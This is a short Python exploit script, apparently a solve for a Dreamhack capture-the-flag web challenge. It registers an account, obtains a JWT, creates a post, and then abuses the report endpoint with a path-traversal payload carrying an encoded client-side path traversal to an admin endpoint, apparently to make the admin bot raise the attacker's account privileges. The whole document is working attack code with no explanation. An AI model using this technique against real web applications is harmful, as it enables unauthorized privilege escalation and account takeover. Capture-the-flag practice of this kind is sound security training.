import requests
from urllib.parse import quote

url = 'http://host8.dreamhack.games:11187'
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/api/user/signup', json=creds)
res = s.post(f'{url}/api/user/token', json=creds)

token = res.json()['msg']['token']

print("> Token:", token)

s.headers.update({
    'Authorization': f'JWT {token}'
})

res = s.post(f'{url}/api/post/write', json={
    'title': 'a',
    'content': 'a'
})

assert res.json()['msg'] == 'success'
print("> Created post")

# report
cspt = '%2E%2E/set/2?username=hacked'
payload = f'2/../../admin?occupation={quote(cspt)}'

res = s.get(f'{url}/api/post/report', params={
    'id': payload
})

assert(res.json()['msg'] == 'success')
print("> Reported")